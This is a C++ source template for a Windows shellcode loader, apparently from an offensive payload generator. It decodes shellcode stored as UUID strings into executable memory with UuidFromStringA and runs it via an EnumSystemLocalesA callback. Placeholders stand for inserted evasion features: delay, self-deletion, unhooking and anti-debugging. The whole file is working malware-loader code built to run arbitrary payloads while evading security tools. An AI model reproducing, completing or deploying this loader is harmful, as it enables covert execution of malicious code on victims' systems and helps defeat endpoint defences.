#include <Windows.h>
#include <Rpc.h>
#include <iostream>
//####USING####

//####DEFINE####

#pragma comment(lib, "Rpcrt4.lib")


int main()
{

    //####DELAY####
    //####SELF_DELETE####
    //####UNHOOK####
    //####ANTIDEBUG####

    char** uuids = ####SHELLCODE####;
    int elems = ####SHELLCODE_LENGTH####;

    // HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    // void* ha = HeapAlloc(hc, 0, 0x100000);

    VOID* ha = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);
    DWORD_PTR hptr = (DWORD_PTR)ha;

    for (int i = 0; i < elems; i++) {
        printf("[*] Allocating %d of %d uuids\n", i + 1, elems);
        printf("%s\n", *(uuids+i));
        RPC_CSTR rcp_cstr = (RPC_CSTR)*(uuids+i);
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
        if (status != RPC_S_OK) {
            printf("[-] Something went wrong\n");
            CloseHandle(ha);
            return -1;
        }
         hptr += 16;
    }

    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(ha);
    return 0;
}